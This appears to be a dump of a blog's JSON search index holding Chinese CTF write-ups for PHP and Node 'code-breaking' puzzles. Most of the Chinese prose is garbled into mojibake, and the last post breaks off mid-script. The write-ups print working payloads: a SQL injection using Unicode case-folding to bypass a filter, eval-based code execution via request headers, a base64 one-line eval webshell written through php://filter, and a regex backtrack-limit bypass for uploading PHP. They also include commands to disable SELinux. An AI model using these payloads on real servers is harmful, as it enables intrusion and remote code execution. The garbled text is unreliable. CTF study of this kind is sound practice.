&apos;$&#123;password.toUpperCase()&#125;&apos;`) if (user) &#123; ctx.session.user = user jump = ctx.router.url(&apos;admin&apos;) &#125; &#125; ctx.status = 303 ctx.redirect(jump) &#125; else &#123; await ctx.render(&apos;index&apos;) &#125;&#125; ä¸‡èƒ½å¯†ç å°è¯• 1230&apos;or &apos;1&apos;=&apos;10&apos;or &apos;1&apos;=&apos;1ä½†æ˜¯è¿›å»ä¹‹åæ²¡å•¥ä¸œè¥¿ï¼Œéœ€è¦æš´åº“ æ€è·¯æ˜¯åˆ©ç”¨toUpperCaseï¼ˆï¼‰ï¼Œè¿™ä¸¤ä¸ªå­—ç¬¦çš„â€œå¤§å†™â€æ˜¯Iå’ŒSã€‚ä¹Ÿå°±æ˜¯è¯´â€Ä±â€.toUpperCase() == â€˜Iâ€™ï¼Œâ€Å¿â€.toUpperCase() == â€˜Sâ€™ã€‚é€šè¿‡è¿™ä¸ªå°ç‰¹æ€§å¯ä»¥ç»•è¿‡ä¸€äº›é™åˆ¶ã€‚ è¿™ä¸ªâ€â„ªâ€çš„â€œå°å†™â€å­—ç¬¦æ˜¯kï¼Œä¹Ÿå°±æ˜¯â€â„ªâ€.toLowerCase() == â€˜kâ€™. æ‰€ä»¥å¯ä»¥æ„é€ payloadç»•è¿‡wafï¼š 1SELECT * FROM &quot;users&quot; WHERE &quot;username&quot; = &apos;0&apos; AND &quot;password&quot; = &apos;0&apos; union select 1,2 where &apos;1&apos;=&apos;1&apos; username: 0 password: 0â€™ unÄ±on Å¿elect 1,flag,3 where â€˜1â€™=â€™1 ä½†æ˜¯æˆ‘å¯èƒ½ç¯å¢ƒè¿˜æ˜¯æœ‰é—®é¢˜ï¼Œè¿”å›Internal Server Error ä¸‹é¢æ˜¯consoleçš„æµ‹è¯• åé¢çš„é¢˜ç›®è¿‡å‡ å¤©å†åšæŠŠï¼Œæ…¢å°±æ˜¯å¿« â”â”³â” â”â”³â” å‚è€ƒé“¾æ¥ï¼šhttp://f1sh.site/2018/11/25/code-breaking-puzzles%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/ https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html","categories":[],"tags":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"http://yoursite.com/tags/ä»£ç å®¡è®¡/"},{"name":"codebreaking","slug":"codebreaking","permalink":"http://yoursite.com/tags/codebreaking/"}]},{"title":"codebreaking-4","slug":"codebreaking-4","date":"2019-08-14T23:16:56.000Z","updated":"2019-08-22T13:46:44.042Z","comments":true,"path":"2019/08/15/codebreaking-4/","link":"","permalink":"http://yoursite.com/2019/08/15/codebreaking-4/","excerpt":"æ–°çš„ä¸€å¤©ï¼Œå†åšå‡ é¢˜ï¼Œç­‰ä¸‹9ï¼š30å¼€å§‹åšichunqiuä¸Šçš„ç½‘ç»œä¸ä¿¡æ¯å®‰å…¨é¢†åŸŸä¸“é¡¹èµ›ï¼Œå¸Œæœ›å¤§ä½¬ä»¬å¸¦æˆ‘é£ğŸ˜˜ 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;","text":"æ–°çš„ä¸€å¤©ï¼Œå†åšå‡ é¢˜ï¼Œç­‰ä¸‹9ï¼š30å¼€å§‹åšichunqiuä¸Šçš„ç½‘ç»œä¸ä¿¡æ¯å®‰å…¨é¢†åŸŸä¸“é¡¹èµ›ï¼Œå¸Œæœ›å¤§ä½¬ä»¬å¸¦æˆ‘é£ğŸ˜˜ 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt; easy - phplimit123456&lt;?php if(&apos;;&apos; === preg_replace(&apos;/[^\\W]+\\((?R)?\\)/&apos;, &apos;&apos;, $_GET[&apos;code&apos;])) &#123; eval($_GET[&apos;code&apos;]); &#125; else &#123; show_source(__FILE__); &#125; é¦–å…ˆæ­å»ºç¯å¢ƒï¼Œæ˜¯nginxï¼Œå…ˆç”¨phpstudyçš„nginxæ­å»ºè¯•è¯•ï¼Œä¸è¡Œå†ç”¨linuxè™šæ‹Ÿæœº(ï¿£â–½ï¿£)â€ åŸé¢˜æ˜¯rctfçš„r-cursiveï¼Œä¸¤é¢˜çš„æ„æ€éƒ½æ˜¯åªèƒ½ä¼ å…¥å‡½æ•°ï¼Œé»é‚£ä¸ªc (?R)æ˜¯å¼•ç”¨å½“å‰è¡¨è¾¾å¼çš„æ„æ€ï¼Œå³å¯ä»¥ç”¨\\w+((?R)?)æ›¿æ¢åˆ°(?R)çš„ä½ç½®ï¼Œå› æ­¤å¯ä»¥è¡ç”ŸæˆåŒ¹é…\\w+(\\w+((?R)?))ã€\\w+(\\w+(\\w+((?R)?)))ã€â€¦(?R)? è¿™é‡Œå¤šä¸€ä¸ª?è¡¨ç¤ºå¯ä»¥æœ‰å¼•ç”¨ï¼Œä¹Ÿå¯ä»¥æ²¡æœ‰ã€‚ åŸç†æ˜¯åˆ©ç”¨phpçš„getallheaders()ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è®¾ç½®uaæ¥ä¼ å…¥å­—ç¬¦ä¸²ï¼ŒæˆåŠŸæ‰§è¡Œæˆ‘æƒ³è¦çš„å‘½ä»¤ã€‚è¿™é‡Œæˆ‘ä»¬å…ˆçœ‹çœ‹phpinfoçš„å†…å®¹ã€‚ payloadï¼š ?code=eval(implode(array_reverse(getallheaders()))); åœ¨headersçš„Hostä¸Šé¢ä¸€è¡Œæ·»åŠ  1: phpinfo();// éœ€è¦çš„æ³¨æ„çš„æ˜¯getallheaders()å¥½åƒæ˜¯é»˜è®¤æ˜¯é€†åºçš„ï¼Œæˆ‘åŠ äº†var_dump()æŸ¥çœ‹ okï¼Œæœ¬é¢˜æ€è·¯ç±»ä¼¼ï¼Œä½†æ˜¯nginx æˆ‘è¯•äº†è¯•ä¸Šé¢çš„payloadï¼Œå±…ç„¶ä¹Ÿå¯ä»¥ï¼Ÿï¼Ÿï¼Ÿï¼ŸğŸ˜¢ æœ¬æ¥getallheaders()æ˜¯apacheæ¨¡å—çš„å‡½æ•°ï¼Œå¯èƒ½æ˜¯phpstudyçš„nginxç¯å¢ƒé—®é¢˜ï¼Œæˆ‘æ²¡æœ‰å¯¹nginxè¿›è¡Œé…ç½®ã€‚ å‡è£…è¿™æ˜¯ä¸è¡Œçš„ï¼Œå¯»æ‰¾nginxä¸­èƒ½ä»£æ›¿getallheaders()çš„å‡½æ•° get_defined_vars()è¿”å›æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„ï¼Œè¿™ä¸ªå·²å®šä¹‰çš„å˜é‡é‡Œå°±åŒ…æ‹¬äº†$_GETã€$_POSTç­‰æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„å˜é‡ï¼Œæ‰€ä»¥æŠŠè¦æ‰§è¡Œçš„ä»£ç å†™åœ¨å…¶ä»–çš„getå‚æ•°é‡Œå³å¯ æ„é€ payloadï¼š ?aa=phpinfo();//&amp;code=eval(implode(reset(get_defined_vars()))); é™„ä¸Šå¦ä¸€ä¸ªå¤§å¸ˆå‚…çš„payloadï¼š 1?code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd()))))))); d=====(ï¿£â–½ï¿£*)b å‚è€ƒé“¾æ¥ï¼šhttps://lorexxar11.cn/2018/05/23/rctf2018/ http://f1sh.site/2018/11/25/code-breaking-puzzles%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/","categories":[],"tags":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"http://yoursite.com/tags/ä»£ç å®¡è®¡/"},{"name":"codebreaking","slug":"codebreaking","permalink":"http://yoursite.com/tags/codebreaking/"}]},{"title":"codebreaking-3","slug":"codebreaking-3","date":"2019-08-14T07:35:35.000Z","updated":"2019-08-22T13:46:51.659Z","comments":true,"path":"2019/08/14/codebreaking-3/","link":"","permalink":"http://yoursite.com/2019/08/14/codebreaking-3/","excerpt":"ç¬¬ä¸‰é¢˜leiå•¦æ‹‰æ‹‰ easy - phpmagic1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;","text":"ç¬¬ä¸‰é¢˜leiå•¦æ‹‰æ‹‰ easy - phpmagic1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt; 12345678910111213141516171819202122232425262728&lt;?php if(isset($_GET[&apos;read-source&apos;])) &#123; exit(show_source(__FILE__)); &#125; define(&apos;DATA_DIR&apos;, dirname(__FILE__) . &apos;/data/&apos; . md5($_SERVER[&apos;REMOTE_ADDR&apos;])); if(!is_dir(DATA_DIR)) &#123; mkdir(DATA_DIR, 0755, true); &#125; chdir(DATA_DIR); $domain = isset($_POST[&apos;domain&apos;]) ? $_POST[&apos;domain&apos;] : &apos;&apos;; $log_name = isset($_POST[&apos;log&apos;]) ? $_POST[&apos;log&apos;] : date(&apos;-Y-m-d&apos;); if(!empty($_POST) &amp;&amp; $domain): $command = sprintf(&quot;dig -t A -q %s&quot;, escapeshellarg($domain)); $output = shell_exec($command); $output = htmlspecialchars($output, ENT_HTML401 | ENT_QUOTES); $log_name = $_SERVER[&apos;SERVER_NAME&apos;] . $log_name; if(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [&apos;php&apos;, &apos;php3&apos;, &apos;php4&apos;, &apos;php5&apos;, &apos;phtml&apos;, &apos;pht&apos;], true)) &#123; file_put_contents($log_name, $output); &#125; echo $output; endif; ?&gt; escapeshellarg()æŠŠå­—ç¬¦ä¸²è½¬ç ä¸ºå¯ä»¥åœ¨ shell å‘½ä»¤é‡Œä½¿ç”¨çš„å‚æ•°ï¼Œå°†ç»™å­—ç¬¦ä¸²å¢åŠ ä¸€ä¸ªå•å¼•å·å¹¶ä¸”èƒ½å¼•ç”¨æˆ–è€…è½¬ç ä»»ä½•å·²ç»å­˜åœ¨çš„å•å¼•å·ï¼Œè¿™æ ·ä»¥ç¡®ä¿èƒ½å¤Ÿç›´æ¥å°†ä¸€ä¸ªå­—ç¬¦ä¸²ä¼ å…¥ shell å‡½æ•°ï¼Œå¹¶ä¸”è¿˜æ˜¯ç¡®ä¿å®‰å…¨çš„ã€‚ htmlspecialchars()å°†ç‰¹æ®Šå­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“ è€Œä¸€å¥è¯æœ¨é©¬éœ€è¦&lt; é¦–å…ˆç¬¬ä¸€æ­¥ï¼Œè§£å†³&lt;è¢«è½¬ä¹‰çš„é—®é¢˜ file_put_contents($log_name, $output); åœ¨file_put_contents()ä¸­ï¼Œ$log_nameå¯ä»¥è®¾ç½®è¯»å–æ–‡ä»¶å†…å®¹è§£ç ï¼Œé‚£ä¹ˆåªéœ€è¦å°†æ–‡ä»¶å†…å®¹base64ç¼–ç å³å¯ æµ‹è¯•å‘ç°ï¼š éœ€è¦æŠŠæœåŠ¡å™¨éƒ¨ç½²åˆ°linuxä¸Šï¼Œå› ä¸ºwindowsä¸­æ²¡æœ‰digè¿™ä¸ªå‘½ä»¤ğŸ˜” $log_nameæ˜¯å–è‡ªhttpå¤´ä¸­çš„host è€Œ$outputä¸­æœ‰ä¸€éƒ¨åˆ†å†…å®¹æ˜¯domain ç¬¬äºŒæ­¥ï¼Œè§£å†³æ–‡ä»¶åç¼€çš„é—®é¢˜ åªè¦åœ¨åç¼€åååŠ ä¸Š/. pathinfoå°±å–ä¸åˆ°åç¼€åï¼Œä¸”å¯ä»¥æ­£å¸¸å†™å…¥.phpä¹‹ä¸­ã€‚å…·ä½“åŸç†å¯ä»¥å‚è€ƒé“¾æ¥ğŸ˜€ï¼Œphpåœ¨å¤„ç†è·¯å¾„çš„æ—¶å€™ï¼Œä¼šé€’å½’çš„åˆ é™¤æ‰è·¯å¾„ä¸­å­˜åœ¨çš„/. è§£ç ä¸­é‡åˆ°ä¸ç¬¦åˆè§„èŒƒçš„å­—ç¬¦ç›´æ¥è·³è¿‡ã€‚æ‰€ä»¥è™½ç„¶æˆ‘ä»¬åªèƒ½æ§åˆ¶ä¸€éƒ¨åˆ†å†…å®¹ï¼Œä½†æ˜¯å…¶ä»–å†…å®¹å¹¶ä¸å½±å“base64è§£ç ã€‚å¦å¤–å› ä¸ºbase64è§£ç æ˜¯4ä½4ä½çš„è§£çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ä¿è¯æˆ‘ä»¬éœ€è¦è§£ç çš„å­—ç¬¦ä¸²ä¹‹å‰çš„åˆæ³•å­—ç¬¦æ•°ä¸º4çš„å€æ•°ï¼Œå­—ç¬¦èŒƒå›´æ˜¯Aâ€”Zï¼Œaâ€”zï¼Œ0â€”9ï¼Œ+ï¼Œ/ æµ‹è¯•ï¼š æœé›†åˆšæ‰çš„xxxå¾—åˆ°çš„ç»“æœï¼ˆæ³¨æ„å»æ‰ç¬¦å·ï¼‰ä¸º ltltgtgtDiG994RedHat99474el762ltltgtgttAqï¼Œé•¿åº¦ä¸º41ï¼Œæ‰€ä»¥éœ€è¦å…ˆè¡¥å……3ä¸ªæ²¡ç”¨çš„aaaã€‚è¿™é‡Œè¿˜æœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œbase64ä¸­çš„=åªèƒ½å‡ºç°åœ¨æœ€æœ«å°¾ï¼Œè€Œæˆ‘ä»¬æ’å…¥çš„å­—ç¬¦ä¸²æ˜¯åœ¨ä¸­é—´çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æ’å…¥çš„å­—ç¬¦ä¸²é‡Œä¸èƒ½æœ‰= åœ¨çº¿çš„base64ä¸­å­˜åœ¨ ==ï¼Œç”¨phpçš„base64_encodeä¸å­˜åœ¨ == payload: host:php ?domain=aaaPD9waHAgQGV2YWwoJF9HRVRbJzEyMyddKTs/Pg&amp;log=://filter/convert.base64-decode/resource=a3.php/. ä½†æ˜¯åˆå¥‡äº†ä¸ªæ€ªï¼Œæ€ä¹ˆä¹Ÿå†™ä¸è¿›å»ã€‚ã€‚ã€‚ file_put_contents()è¯¥å‡½æ•°å°†è¿”å›å†™å…¥åˆ°æ–‡ä»¶å†…æ•°æ®çš„å­—èŠ‚æ•°ï¼Œå¤±è´¥æ—¶è¿”å›FALSE var_dump(file_put_contents())å‘ç°ç¡®å®æ˜¯falseï¼Œæƒé™ä¹Ÿæ”¹æˆ777äº†ï¼Œæˆ‘cao åˆæ˜¯ä¹‹å‰é‡åˆ°è¿‡çš„é‚£ä¸ªé—®é¢˜ï¼Œçªç„¶æƒ³èµ·æ¥centos7éœ€è¦ å…³é—­SELINUX 1234&gt; vi /etc/selinux/config&gt; SELINUX=disabled #å¢åŠ ï¼Œåˆ«çš„éƒ½æ³¨é‡Šæ‰&gt; setenforce 0 #ä½¿é…ç½®ç«‹å³ç”Ÿæ•ˆ&gt; å†™å…¥æˆåŠŸï¼ï¼ğŸ˜€ ä¸€ä¸ªæ–‡ä»¶åªèƒ½å†™ä¸€æ¬¡ï¼Œå¦‚æœæ–‡ä»¶å·²ç»å­˜åœ¨ä¹Ÿä¼šå†™å…¥å¤±è´¥ å¦‚æœbase64ç¼–ç æœ€åå‡ºç°äº†==ï¼Œå¯ä»¥èˆå»ï¼Œå› ä¸ºæœ¬æ¥ä¹Ÿæ˜¯ç”¨æ¥è¡¥å…¨çš„ å‚è€ƒé“¾æ¥ï¼šhttp://wonderkun.cc/index.html/?p=626#comments https://paper.seebug.org/755/#easy-phpmagic http://f1sh.site/2018/11/25/code-breaking-puzzles%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/","categories":[],"tags":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"http://yoursite.com/tags/ä»£ç å®¡è®¡/"},{"name":"codebreaking","slug":"codebreaking","permalink":"http://yoursite.com/tags/codebreaking/"}]},{"title":"æœªå®Œæˆçš„seacms","slug":"æœªå®Œæˆçš„seacms","date":"2019-08-14T04:02:41.000Z","updated":"2019-08-22T13:47:25.007Z","comments":true,"path":"2019/08/14/æœªå®Œæˆçš„seacms/","link":"","permalink":"http://yoursite.com/2019/08/14/æœªå®Œæˆçš„seacms/","excerpt":"æ˜¨å¤©å¤ç°äº†chinazä¸­çš„3ä¸ªå‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œå…¶ä¸­ç¬¬3ä¸ªè™½ç„¶å¤ç°æˆåŠŸäº†ï¼Œä½†æ˜¯å¯¹payloadè¿˜æ˜¯ä¸å¤ªæ‡‚ï¼ŒåŸç†ä¸æµ·æ´‹CMSç±»ä¼¼ï¼Œè¿™é‡Œå°±æ¥å¤ç°ä¸‹æµ·æ´‹CMS 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;","text":"function doDecrypt (pwd, onError) { console.log('in doDecrypt'); const txt = document.getElementById('enc_content').innerHTML; let plantext; try { const bytes = CryptoJS.AES.decrypt(txt, pwd); var plaintext = bytes.toString(CryptoJS.enc.Utf8); } catch(err) { if(onError) { onError(err); } return; } document.getElementById('enc_content').innerHTML = plaintext; document.getElementById('enc_content').style.display = 'block'; document.getElementById('enc_passwd').style.display = 'none'; if(typeof MathJax !== 'undefined') { MathJax.Hub.Queue( ['resetEquationNumbers', MathJax.InputJax.TeX], ['PreProcess', MathJax.Hub], ['Reprocess', MathJax.Hub] ); } } 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 var onError = function(error) { document.getElementById(\"enc_error\").innerHTML = \"password error!\" }; function decrypt() { var passwd = document.getElementById(\"enc_pwd_input\").value; console.log(passwd); doDecrypt(passwd, onError); }","categories":[],"tags":[{"name":"cms","slug":"cms","permalink":"http://yoursite.com/tags/cms/"}]},{"title":"codebreaking-2","slug":"codebreaking-2","date":"2019-08-14T04:01:05.000Z","updated":"2019-08-22T13:46:58.152Z","comments":true,"path":"2019/08/14/codebreaking-2/","link":"","permalink":"http://yoursite.com/2019/08/14/codebreaking-2/","excerpt":"ç¬¬äºŒé¢˜leiå•¦å•¦å•¦ 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;","text":"ç¬¬äºŒé¢˜leiå•¦å•¦å•¦ 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt; easy - pcrewaf1234567891011121314151617&lt;?php function is_php($data)&#123; return preg_match(&apos;/&lt;\\?.*[(`;?&gt;].*/is&apos;, $data); &#125; if(empty($_FILES)) &#123; die(show_source(__FILE__)); &#125; $user_dir = &apos;data/&apos; . md5($_SERVER[&apos;REMOTE_ADDR&apos;]); $data = file_get_contents($_FILES[&apos;file&apos;][&apos;tmp_name&apos;]); if (is_php($data)) &#123; echo &quot;bad request&quot;; &#125; else &#123; @mkdir($user_dir, 0755); $path = $user_dir . &apos;/&apos; . random_int(0, 10) . &apos;.php&apos;; move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;], $path); header(&quot;Location: $path&quot;, true, 303); &#125; æ–‡ä»¶åä¸å¯æ§ï¼Œæ–‡ä»¶å†…å®¹å¯æ§ ä½†æ˜¯éœ€è¦ç»•è¿‡ preg_match(â€˜/&lt;?.[(`;?&gt;]./isâ€™, $data); å‚è€ƒé“¾æ¥é‡Œé¢çš„ pcre.backtrack_limit è¿™ä¸ªé…ç½®å†³å®šäº†åœ¨phpä¸­ï¼Œæ­£åˆ™å¼•æ“å›æº¯çš„å±‚æ•°ã€‚è€Œè¿™ä¸ªå€¼é»˜è®¤æ˜¯1000000. ä¸¾ä¸ªä¾‹å­ 123æ­£åˆ™ï¼š\\&lt;\\?.*[(`;?&gt;].*è¾“å…¥ï¼š&lt;?php phpinfo();//aaaaa 1234567891011121314åŒ¹é…è¿‡ç¨‹\\&lt; =&gt; &lt;\\? =&gt; ?.* =&gt; php phpinfo();//aaaaa [(`;?&gt;] =&gt; php phpinfo();//aaaa å¼€å§‹å›æº¯ 1 [(`;?&gt;] =&gt; phpinfo();//aaa 21[(`;?&gt;] =&gt; phpinfo();//aa 3[(`;?&gt;] =&gt; phpinfo();//a 4[(`;?&gt;] =&gt; phpinfo();// 5[(`;?&gt;] =&gt; phpinfo();/ 6[(`;?&gt;] =&gt; phpinfo(); 7[(`;?&gt;] =&gt; phpinfo() 8[(`;?&gt;] =&gt; phpinfo();.* =&gt; phpinfo();//aaaaa ä¸€å…±å›æº¯äº†8æ¬¡ å¯æƒ³è€ŒçŸ¥ï¼Œå›æº¯çš„æ¬¡æ•°æ˜¯æœ‰ä¸Šé™çš„ï¼Œé»˜è®¤æ˜¯100ä¸‡ï¼Œå¯ä»¥é€šè¿‡è¯­å¥æ¥æŸ¥çœ‹ 1234var_dump(ini_get(&apos;pcre.backtrack_limit&apos;));è¿”å›string(7) &quot;1000000&quot; å¦‚æœå›æº¯æ¬¡æ•°è¶…è¿‡äº†100ä¸‡ï¼ŒæŸ¥çœ‹ 1234var_dump(preg_match(&apos;/&lt;\\?.*[(`;?&gt;].*/is&apos;, &apos;&lt;?php phpinfo();//.str_repeat(&apos;c&apos;,1000000)&apos;));è¿”å›bool(false) æ‰€ä»¥ï¼Œè¿™é“é¢˜çš„ç­”æ¡ˆå°±å‘¼ä¹‹æ¬²å‡ºäº†ã€‚æˆ‘ä»¬é€šè¿‡å‘é€è¶…é•¿å­—ç¬¦ä¸²çš„æ–¹å¼ï¼Œä½¿æ­£åˆ™æ‰§è¡Œå¤±è´¥ï¼Œæœ€åç»•è¿‡ç›®æ ‡å¯¹PHPè¯­è¨€çš„é™åˆ¶ã€‚ 123456789import requestsfrom 